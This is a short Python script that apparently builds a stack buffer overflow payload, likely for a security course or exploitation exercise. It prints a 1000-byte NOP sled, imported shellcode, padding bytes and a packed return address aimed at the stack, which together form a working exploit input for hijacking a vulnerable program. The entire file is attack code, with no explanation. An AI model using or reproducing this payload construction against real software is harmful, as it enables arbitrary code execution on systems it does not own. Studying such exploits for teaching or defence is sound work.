from shellcode import shellcode
from struct import pack

print ('\x90'*1000) + shellcode + ('\x61' * 10) + pack('<I', 0xbffee700)
